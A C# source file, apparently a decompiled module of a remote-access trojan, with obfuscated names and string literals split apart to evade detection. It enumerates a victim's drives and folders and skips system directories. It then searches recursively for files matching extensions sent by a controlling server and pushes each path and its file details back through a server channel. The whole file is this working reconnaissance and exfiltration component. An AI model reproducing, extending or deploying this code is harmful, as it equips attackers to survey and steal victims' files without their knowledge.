using System;
using System.Collections.Generic;
using System.IO;

namespace rgiwsdasxa;

internal class rgiwsdasxaDRIVF
{
	public string rgiwsdasxafilesLogs = rgiwsdasxaCONF.rgiwsdasxafilesLogs;

	public int rgiwsdasxafIndx = 0;

	public bool rgiwsdasxareaging = false;

	public rgiwsdasxaMCDM iserver;

	public List<string> rgiwsdasxafExts = new List<string>();

	public List<string> rgiwsdasxanotFilders = new List<string>();

	public string rgiwsdasxamainPath;

	public int rgiwsdasxasIndx = 0;

	public List<string> rgiwsdasxasFiles = new List<string>();

	public bool rgiwsdasxaseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public rgiwsdasxaDRIVF()
	{
		rgiwsdasxanotFilders.Add("clients_data|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		rgiwsdasxanotFilders.Add("program files|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		rgiwsdasxanotFilders.Add("system volume information|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		rgiwsdasxanotFilders.Add("$recycle.bin|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		rgiwsdasxanotFilders.Add("msocache|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		rgiwsdasxanotFilders.Add("recoveDSDF|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		rgiwsdasxanotFilders.Add("documents and settings|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		rgiwsdasxanotFilders.Add("windows|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		rgiwsdasxanotFilders.Add("program files (x86)|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		rgiwsdasxanotFilders.Add("programdata|rgiwsdasxa".Split(new char[1] { '|' })[0]);
	}

	public IEnumerable<string> rgiwsdasxaaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.rgiwsdasxaautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (rgiwsdasxaseeAccess(text) && !rgiwsdasxanotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void rgiwsdasxalookFiles(string tempStr)
	{
		iserver.rgiwsdasxaautCnls = false;
		rgiwsdasxafExts.Clear();
		rgiwsdasxasFiles.Clear();
		rgiwsdasxafIndx = 0;
		rgiwsdasxasIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				rgiwsdasxafExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			rgiwsdasxareaging = true;
			rgiwsdasxasendSearch(array[1]);
			rgiwsdasxareaging = false;
			iserver.rgiwsdasxapush_data(null, "rgiwsdasxa-seard=searched|rgiwsdasxa".Split(new char[1] { '|' })[0]);
		}
	}

	public string rgiwsdasxacheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (rgiwsdasxaseeAccess(text2))
				{
					text = text + text2 + ">|rgiwsdasxa".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void rgiwsdasxasendSearch(string path)
	{
		try
		{
			foreach (string item in rgiwsdasxaaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (rgiwsdasxafExts.Contains(text.ToLower()))
				{
					string text2 = iserver.rgiwsdasxafile_info(item, ret: true);
					iserver.rgiwsdasxapush_data(null, "rgiwsdasxa-searf=|rgiwsdasxa".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|rgiwsdasxa".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.rgiwsdasxaautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string rgiwsdasxalookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|rgiwsdasxa".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string rgiwsdasxalookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|rgiwsdasxa".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
